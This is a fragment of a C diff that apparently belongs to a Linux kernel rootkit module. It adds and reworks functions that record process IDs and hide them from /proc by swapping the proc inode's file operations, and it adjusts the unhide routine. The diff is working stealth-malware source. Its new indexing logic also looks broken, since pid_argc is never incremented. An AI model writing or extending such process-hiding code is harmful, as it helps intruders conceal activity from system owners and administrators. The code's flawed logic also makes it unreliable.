@@ -66,19 +66,26 @@ static void hide_proc_tree(){
 	}
 }
 
+void hide_process(int pid){
+	if(pid_argc < MAX_PIDC){
+		hide_pid[pid_argc] = pid;
+		snprintf(pid_array[pid_argc], MAX_PID_LEN, "%d", pid); //since we don't have itoa
+	}
+}
+
 void hide_processes(){
 	int i;
-	
-	
+		
 	for(i=0; i< pid_argc; i++){
-		snprintf(pid_array[i], MAX_PID_LEN, "%d", hide_pid[i]); //since we don't have itoa
-		printk(KERN_INFO "pid: %s\n", pid_array[i]);
+		hide_process(hide_pid[i]);
 	}
 	hide_proc_tree();
 } 
 
 void unhide_processes(void){
-	if(is_hidden == 1)
+	if(is_hidden == 1){
 		proc_inode->i_fop = original_fops;
+		is_hidden = 0;
+	}
 }
 
